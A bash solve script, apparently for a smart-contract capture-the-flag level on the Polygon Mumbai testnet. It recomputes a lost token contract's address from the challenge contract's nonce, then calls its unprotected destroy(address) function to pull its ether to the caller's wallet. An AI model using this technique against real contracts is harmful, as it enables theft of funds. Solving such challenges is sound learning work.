#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

PUBLIC_KEY="$(cast wallet address $PRIVATE_KEY)"

echo "[INFO] Getting token contract address..." >&2
NONCE=$(cast nonce \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    $CONTRACT_ADDRESS) 
let "NONCE -= 1"

TOKEN_CONTRACT_ADDRESS=$(cast compute-address --nonce $NONCE $CONTRACT_ADDRESS | awk '{ print $NF }')

echo "[INFO] Getting the ether back..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    $TOKEN_CONTRACT_ADDRESS \
    "destroy(address)" \
    $PUBLIC_KEY

if [ $? -eq 0 ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed" >&2
fi
